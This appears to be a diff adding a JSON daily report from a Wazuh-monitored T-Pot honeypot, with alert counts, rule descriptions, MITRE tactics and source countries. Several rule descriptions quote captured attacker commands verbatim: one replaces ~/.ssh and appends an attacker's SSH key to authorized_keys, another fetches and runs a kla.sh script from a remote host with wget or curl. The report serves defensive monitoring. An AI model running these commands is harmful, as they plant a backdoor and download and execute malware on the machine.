@@ -1,0 +1,959 @@
+{
+  "wazuh": {
+    "source": "wazuh",
+    "summary": {
+      "severity": {
+        "low": 166816,
+        "high": 1544,
+        "medium": 2370,
+        "critical": 393,
+        "informational": 0
+      },
+      "total_alerts": 171123,
+      "geolocated_alerts": 5797,
+      "attack_related_alerts": 15503,
+      "honeypot_interactions": 157365,
+      "authentication_failures": 2375,
+      "authentication_successes": 448,
+      "country_coverage_percent": 3.39
+    },
+    "top_rules": [
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 103347
+          }
+        ],
+        "rule_id": "110209",
+        "alert_count": 103347,
+        "description": "T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 12269
+          }
+        ],
+        "rule_id": "110207",
+        "alert_count": 12269,
+        "description": "T-Pot SentryPeer SIP activity from [IP address]:6720, method ACK",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 12158
+          }
+        ],
+        "rule_id": "110204",
+        "alert_count": 12158,
+        "description": "T-Pot Honeytrap connection from [IP address] to port 5908",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 11860
+          }
+        ],
+        "rule_id": "110213",
+        "alert_count": 11860,
+        "description": "T-Pot RDP connection from [IP address] to port 3389.",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 11180
+          }
+        ],
+        "rule_id": "110205",
+        "alert_count": 11180,
+        "description": "T-Pot Honeytrap received a payload from [IP address]",
+        "highest_level": 6
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 5687
+          }
+        ],
+        "rule_id": "110219",
+        "alert_count": 5687,
+        "description": "T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out')",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 3031
+          }
+        ],
+        "rule_id": "23502",
+        "alert_count": 3031,
+        "description": "The CVE-2012-4542 that affected linux-image-6.8.0-138-generic was solved due to an update in the agent or feed.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2810
+          }
+        ],
+        "rule_id": "110101",
+        "alert_count": 2810,
+        "description": "Cowrie SSH connection from [IP address].",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2375
+          }
+        ],
+        "rule_id": "110102",
+        "alert_count": 2375,
+        "description": "Cowrie failed login from [IP address] using username root.",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1199
+          }
+        ],
+        "rule_id": "110104",
+        "alert_count": 1199,
+        "description": "Cowrie captured a command from [IP address]: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1160
+          }
+        ],
+        "rule_id": "23505",
+        "alert_count": 1160,
+        "description": "CVE-2017-13165 affects linux-image-6.8.0-142-generic",
+        "highest_level": 10
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 953
+          }
+        ],
+        "rule_id": "23508",
+        "alert_count": 953,
+        "description": "CVE-2012-4542 affects linux-image-6.8.0-142-generic (Missing information, CVE awaiting analysis)",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 528
+          }
+        ],
+        "rule_id": "23504",
+        "alert_count": 528,
+        "description": "CVE-2015-7837 affects linux-image-6.8.0-142-generic",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 426
+          }
+        ],
+        "rule_id": "110201",
+        "alert_count": 426,
+        "description": "T-Pot Dionaea pptpd connection from [IP address] to port 1723",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 245
+          }
+        ],
+        "rule_id": "23506",
+        "alert_count": 245,
+        "description": "CVE-2021-3773 affects linux-image-6.8.0-142-generic",
+        "highest_level": 13
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 240
+          }
+        ],
+        "rule_id": "533",
+        "alert_count": 240,
+        "description": "Listened ports status (netstat) changed (new port opened or closed).",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 192
+          },
+          {
+            "name": "wazuh",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "5501",
+        "alert_count": 194,
+        "description": "PAM: Login session opened.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 164
+          },
+          {
+            "name": "wazuh",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "5502",
+        "alert_count": 166,
+        "description": "PAM: Login session closed.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 157
+          }
+        ],
+        "rule_id": "110103",
+        "alert_count": 157,
+        "description": "Cowrie accepted login from [IP address] using username malik.",
+        "highest_level": 10
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 142
+          }
+        ],
+        "rule_id": "110109",
+        "alert_count": 142,
+        "description": "Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "highest_level": 13
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 97
+          }
+        ],
+        "rule_id": "110216",
+        "alert_count": 97,
+        "description": "T-Pot Mailoney received SMTP command from [IP address]: QUIT",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 96
+          },
+          {
+            "name": "wazuh",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "5715",
+        "alert_count": 97,
+        "description": "sshd: authentication success.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 86
+          }
+        ],
+        "rule_id": "110105",
+        "alert_count": 86,
+        "description": "Cowrie captured a file download from [IP address].",
+        "highest_level": 12
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 75
+          }
+        ],
+        "rule_id": "110221",
+        "alert_count": 75,
+        "description": "T-Pot CiscoASA detected configuration discovery from [IP address]: \"GET /SETTINGS.CFG HTTP/1.1\" 404 -",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 44
+          },
+          {
+            "name": "tpot",
+            "alerts": 28
+          }
+        ],
+        "rule_id": "2904",
+        "alert_count": 72,
+        "description": "Dpkg (Debian Package) half configured.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 67
+          }
+        ],
+        "rule_id": "110212",
+        "alert_count": 67,
+        "description": "T-Pot Honeytrap detected repeated payload activity from [IP address].",
+        "highest_level": 10
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 54
+          }
+        ],
+        "rule_id": "110106",
+        "alert_count": 54,
+        "description": "Cowrie detected repeated failed logins from [IP address].",
+        "highest_level": 10
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 32
+          },
+          {
+            "name": "tpot",
+            "alerts": 22
+          }
+        ],
+        "rule_id": "2902",
+        "alert_count": 54,
+        "description": "New dpkg (Debian Package) installed.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 49
+          }
+        ],
+        "rule_id": "110215",
+        "alert_count": 49,
+        "description": "T-Pot MiniPrint event: connection, action open_conn, Connection opened",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 48
+          }
+        ],
+        "rule_id": "23503",
+        "alert_count": 48,
+        "description": "CVE-2018-1121 affects linux-image-6.8.0-142-generic",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 43
+          }
+        ],
+        "rule_id": "110223",
+        "alert_count": 43,
+        "description": "T-Pot HoneyAML received  request from  to  on port .",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 42
+          }
+        ],
+        "rule_id": "110220",
+        "alert_count": 42,
+        "description": "T-Pot CiscoASA captured a login request from [IP address]: \"POST /login.cgi HTTP/1.1\" 200 -",
+        "highest_level": 8
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 40
+          },
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "510",
+        "alert_count": 41,
+        "description": "Host-based anomaly detection event (rootcheck).",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 29
+          }
+        ],
+        "rule_id": "110208",
+        "alert_count": 29,
+        "description": "T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5085",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 17
+          },
+          {
+            "name": "tpot",
+            "alerts": 8
+          }
+        ],
+        "rule_id": "550",
+        "alert_count": 25,
+        "description": "Integrity checksum changed.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 14
+          }
+        ],
+        "rule_id": "110108",
+        "alert_count": 14,
+        "description": "Cowrie captured suspicious execution or staging activity from $(src_ip): $(input)",
+        "highest_level": 12
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 14
+          }
+        ],
+        "rule_id": "110214",
+        "alert_count": 14,
+        "description": "T-Pot RDP honeypot detected a connection burst from [IP address].",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 7
+          },
+          {
+            "name": "wazuh",
+            "alerts": 7
+          }
+        ],
+        "rule_id": "2901",
+        "alert_count": 14,
+        "description": "New dpkg (Debian Package) requested to install.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 7
+          },
+          {
+            "name": "wazuh",
+            "alerts": 7
+          }
+        ],
+        "rule_id": "2903",
+        "alert_count": 14,
+        "description": "Dpkg (Debian Package) removed.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 11
+          }
+        ],
+        "rule_id": "592",
+        "alert_count": 11,
+        "description": "Log file size reduced.",
+        "highest_level": 8
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 7
+          }
+        ],
+        "rule_id": "110217",
+        "alert_count": 7,
+        "description": "T-Pot Mailoney captured suspicious SMTP activity from [IP address]: mail FROM:<dpr@priv8shop.com> size=84\r",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 6
+          }
+        ],
+        "rule_id": "110107",
+        "alert_count": 6,
+        "description": "Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&",
+        "highest_level": 12
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 6
+          }
+        ],
+        "rule_id": "110225",
+        "alert_count": 6,
+        "description": "T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address].",
+        "highest_level": 13
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 5
+          }
+        ],
+        "rule_id": "110211",
+        "alert_count": 5,
+        "description": "T-Pot Dionaea detected a connection burst from [IP address].",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 4
+          }
+        ],
+        "rule_id": "553",
+        "alert_count": 4,
+        "description": "File deleted.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 4
+          }
+        ],
+        "rule_id": "554",
+        "alert_count": 4,
+        "description": "File added to the system.",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "110218",
+        "alert_count": 2,
+        "description": "T-Pot Mailoney detected repeated SMTP activity from one source.",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "110222",
+        "alert_count": 2,
+        "description": "T-Pot CiscoASA detected repeated web requests from one source.",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "19004",
+        "alert_count": 2,
+        "description": "SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47)",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "203",
+        "alert_count": 2,
+        "description": "Agent event queue is full. Events may be lost.",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "86003",
+        "alert_count": 2,
+        "description": "Docker: Error message",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "11",
+        "alert_count": 1,
+        "description": "Unknown",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "19010",
+        "alert_count": 1,
+        "description": "CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "19011",
+        "alert_count": 1,
+        "description": "CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "202",
+        "alert_count": 1,
+        "description": "Agent event queue is 90% full.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "205",
+        "alert_count": 1,
+        "description": "Agent event queue is back to normal load.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "503",
+        "alert_count": 1,
+        "description": "Wazuh agent started.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "506",
+        "alert_count": 1,
+        "description": "Wazuh agent stopped.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "591",
+        "alert_count": 1,
+        "description": "Log file rotated.",
+        "highest_level": 3
+      }
+    ],
+    "window_end": "2026-09-25T12:55:26Z",
+    "report_date": "2026-09-25",
+    "generated_at": "2026-09-25T12:55:26Z",
+    "window_start": "2026-09-24T12:55:26Z",
+    "mitre_tactics": [
+      {
+        "alerts": 297,
+        "tactic": "Initial Access"
+      },
+      {
+        "alerts": 296,
+        "tactic": "Defense Evasion"
+      },
+      {
+        "alerts": 291,
+        "tactic": "Persistence"
+      },
+      {
+        "alerts": 291,
+        "tactic": "Privilege Escalation"
+      },
+      {
+        "alerts": 97,
+        "tactic": "Lateral Movement"
+      },
+      {
+        "alerts": 54,
+        "tactic": "Credential Access"
+      },
+      {
+        "alerts": 40,
+        "tactic": "Impact"
+      },
+      {
+        "alerts": 20,
+        "tactic": "Execution"
+      },
+      {
+        "alerts": 12,
+        "tactic": "Command and Control"
+      }
+    ],
+    "top_countries": [
+      {
+        "alerts": 165326,
+        "country": "Unknown"
+      },
+      {
+        "alerts": 2698,
+        "country": "New Zealand"
+      },
+      {
+        "alerts": 2308,
+        "country": "Republic of Moldova"
+      },
+      {
+        "alerts": 504,
+        "country": "Germany"
+      },
+      {
+        "alerts": 138,
+        "country": "United Kingdom"
+      },
+      {
+        "alerts": 62,
+        "country": "United States"
+      },
+      {
+        "alerts": 30,
+        "country": "Russia"
+      },
+      {
+        "alerts": 20,
+        "country": "Indonesia"
+      },
+      {
+        "alerts": 6,
+        "country": "Denmark"
+      },
+      {
+        "alerts": 6,
+        "country": "Singapore"
+      },
+      {
+        "alerts": 5,
+        "country": "France"
+      },
+      {
+        "alerts": 3,
+        "country": "Malta"
+      },
+      {
+        "alerts": 3,
+        "country": "Slovakia"
+      },
+      {
+        "alerts": 3,
+        "country": "Sweden"
+      },
+      {
+        "alerts": 3,
+        "country": "Turkey"
+      },
+      {
+        "alerts": 3,
+        "country": "Ukraine"
+      },
+      {
+        "alerts": 2,
+        "country": "Bulgaria"
+      },
+      {
+        "alerts": 2,
+        "country": "Iran"
+      },
+      {
+        "alerts": 1,
+        "country": "China"
+      }
+    ],
+    "mitre_techniques": [
+      {
+        "alerts": 291,
+        "technique": "Valid Accounts"
+      },
+      {
+        "alerts": 97,
+        "technique": "Remote Services"
+      },
+      {
+        "alerts": 54,
+        "technique": "Brute Force"
+      },
+      {
+        "alerts": 36,
+        "technique": "Stored Data Manipulation"
+      },
+      {
+        "alerts": 20,
+        "technique": "Command and Scripting Interpreter"
+      },
+      {
+        "alerts": 12,
+        "technique": "Ingress Tool Transfer"
+      },
+      {
+        "alerts": 6,
+        "technique": "Exploit Public-Facing Application"
+      },
+      {
+        "alerts": 4,
+        "technique": "Data Destruction"
+      },
+      {
+        "alerts": 4,
+        "technique": "File Deletion"
+      },
+      {
+        "alerts": 1,
+        "technique": "Disable or Modify Tools"
+      }
+    ],
+    "attack_categories": {
+      "malware": 112,
+      "web_attack": 43,
+      "smtp_attack": 7,
+      "network_scan": 19,
+      "network_attack": 11247,
+      "reconnaissance": 132,
+      "payload_delivery": 11247,
+      "command_execution": 1361,
+      "authentication_failure": 2375
+    },
+    "export_schema_version": 1
+  },
+  "summary": {
+    "known_count": 0,
+    "artifact_count": 0,
+    "uploaded_count": 0,
+    "malicious_count": 0,
+    "suspicious_count": 0,
+    "lookup_error_count": 0
+  },
+  "artifacts": [],
+  "window_end": "2026-09-25T13:15:05.031Z",
+  "report_date": "2026-09-25",
+  "generated_at": "2026-09-25T13:15:05.063Z",
+  "window_start": "2026-09-24T13:15:05.031Z",
+  "security_onion": {
+    "status": "planned",
+    "integrated": false
+  },
+  "report_schema_version": 2
+}
